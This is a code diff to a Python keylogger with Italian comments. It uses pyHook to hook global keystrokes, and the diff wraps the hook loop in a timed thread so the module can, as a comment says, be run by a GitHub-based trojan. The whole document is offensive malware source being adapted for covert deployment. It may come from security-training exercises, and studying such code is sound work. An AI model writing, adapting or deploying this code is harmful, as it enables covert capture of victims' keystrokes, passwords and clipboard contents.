@@ -12,6 +12,9 @@ import win32clipboard
 # per gestire la pressione dei tasti
 import pyHook
 
+# per la chiusura
+import time
+
 # dichiariamo alcuni oggetti usati di seguito
 # gestisce le finestre
 user32   = windll.user32
@@ -92,7 +95,7 @@ def KeyStroke(event):
     return True
 
 
-def run(**args):
+def main():
     # crea e registra un hookmanager 
     kl         = pyHook.HookManager()
     # all'evento KeyDown chiama KeyStroke
@@ -103,3 +106,13 @@ def run(**args):
     # un modo per ottenerlo è usare il metodo PumpMessages di pythoncom
     pythoncom.PumpMessages()
     # grazie a questo l'input globale può essere gestito da kl.HookKeyboard()
+    
+def run(**args):
+    # dobbiamo dare un tempo finito al modulo per usarlo con il trojan github
+    #facciamo partire la thread
+    t = threading.Thread(target = main, args =())
+    t.start()
+    # registriamo per un poco
+    time.sleep(360)
+    # usciamo
+    return
